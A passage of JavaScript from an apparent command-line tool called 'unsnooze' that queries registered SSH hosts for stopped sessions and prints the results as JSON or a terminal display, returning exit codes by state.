      if (json) console.log('[]');
      else console.log('unsnooze: no hosts registered. Add one: unsnooze hosts add <name> [ssh-destination]');
      return 0;
    }
    // A human at a real terminal reaches sshEnvForHost's interactive
    // prompt-passthrough branch (ssh prompts directly on the console); the
    // daemon/resumer path never sets this, so it always needs a stored
    // credential and falls to needs-auth for a bare `prompt` source.
    const results = await fetchFleet({ hosts, interactive: !!process.stdin.isTTY });
    const actionable = results.some(r => (r.state === 'online' || r.state === 'stale')
      && (r.envelope?.sessions ?? []).some(s => s.status === 'stopped'));
    if (json) console.log(JSON.stringify(results, null, 2));
    else console.log(formatFleetTui(results, { color: shouldUseTui(), hosts }));
    return actionable ? 2 : 0;
  } catch (err) {
    console.error(`unsnooze fleet: ${err?.message || err}`);
    return 1;
  }
}
